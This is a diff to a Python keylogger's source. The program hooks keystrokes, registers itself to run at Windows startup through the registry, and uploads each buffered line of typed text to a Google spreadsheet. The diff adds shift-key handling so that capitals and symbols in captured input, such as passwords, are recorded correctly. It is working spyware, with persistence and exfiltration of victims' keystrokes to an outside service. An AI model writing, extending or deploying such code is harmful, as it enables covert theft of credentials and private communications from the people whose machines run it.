@@ -2,7 +2,6 @@ from winreg import *
 import keyboard
 import json
 import gspread
-import sys
 from oauth2client.client import SignedJwtAssertionCredentials
 import getpass
 import os
@@ -11,6 +10,8 @@ buf = []
 column = 0
 row = 1
 
+SHIFT_KEYS = {'`' : '~', '1' : '!', '2' : '@', '3' : '#', '4' : '$', '5' : '%', '6' : '^', '7': '&',
+              '8' : '*','9' : '(', '0' : ')' , '-' : '_', '=' : '+','[':'{', ']' : '}'}
 def add_to_startup():
     if os.name == "nt":
         add_to_registry_windows()
@@ -58,6 +59,8 @@ def write_to_spread(text):
 
 def tracker(e):
     global buf
+    if e.name == "left shift" or e.name == "right shift":
+        e.name = "shift"
     if e.name == "enter" or e.name == "tab":
         write_to_spread(''.join(buf))
         buf = []
@@ -66,6 +69,13 @@ def tracker(e):
             buf.pop()
     elif e.name == "space":
         buf.append(" ")
+    elif keyboard.is_pressed('shift') and e.name != "shift":
+        if e.name >= 'a' and e.name <= 'z':
+            buf.append(e.name.upper())
+        else:
+            buf.append(SHIFT_KEYS[e.name])
+    elif e.name == "shift":
+        """Don't append"""
     else:
         buf.append(e.name)
 
